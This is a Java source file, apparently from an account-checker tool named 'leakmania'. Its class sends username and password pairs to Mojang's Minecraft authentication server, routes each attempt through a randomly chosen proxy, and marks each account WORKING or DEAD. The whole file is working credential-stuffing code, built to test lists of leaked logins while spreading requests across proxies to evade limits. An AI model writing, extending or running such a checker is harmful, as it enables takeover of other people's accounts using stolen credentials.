package co.leakmania.checker.utils;

import java.util.ArrayList;
import java.util.Random;

import co.leakmania.checker.enums.Protocol;
import co.leakmania.checker.enums.Replies;

public class MojangAPI {
	
	private Random rdm = new Random();
	private String host = "https://authserver.mojang.com/authenticate";
	private String username;
	private String password;
	private String jsonTemplate = "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"%username%\",\"password\":\"%password%\",\"requestUser\":true}";
	private ArrayList<String> proxies;
	private WebClient wb;
	
	public MojangAPI(ArrayList<String> proxies, int timeout) {
		wb = new WebClient(Protocol.HTTPS, timeout);
		if (proxies != null) this.proxies = proxies;
		wb.setURL(host);
	}
	
	public Replies auth() {
		try {
			if (proxies != null) wb.setProxy(getRandomProxy());
			String reply;
			reply = wb.post(jsonTemplate.replace("%username%", username).replace("%password%", password), "application/json");
			if (reply == null) return Replies.DEAD;
			if (isValid(reply)) return Replies.WORKING;
		} catch (Exception e) {
			//e.printStackTrace();
		}
		return Replies.DEAD;
	}
	
	private String getRandomProxy() {
		return proxies.get(rdm.nextInt(proxies.size()));
	}

	public boolean isValid(String reply) {
		if (reply.contains("\"selectedProfile\"")) return true;
		return false;
	} 
	
	public MojangAPI setUsername(String username) {
		this.username = username; return this;
	}
	
	public MojangAPI setPassword(String password) {
		this.password = password; return this;
	}
	
	public String getUsername() {
		return this.username;
	}
	
	public String getPassword() {
		return this.password;
	}
	
	public String getCredentials() {
		return this.username + ":" + this.password;
	}
	
}
